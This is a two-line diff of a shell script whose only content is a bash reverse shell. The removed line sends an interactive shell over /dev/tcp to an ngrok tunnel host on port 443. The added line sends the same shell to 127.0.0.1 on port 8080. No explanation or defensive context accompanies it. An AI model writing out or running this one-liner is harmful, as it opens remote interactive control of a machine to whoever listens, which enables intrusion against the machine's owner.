@@ -1,2 +1,2 @@
 #!/bin/sh
-bash -i >& /dev/tcp/74d6-94-188-248-74.eu.ngrok.io/443 0>&1
+bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
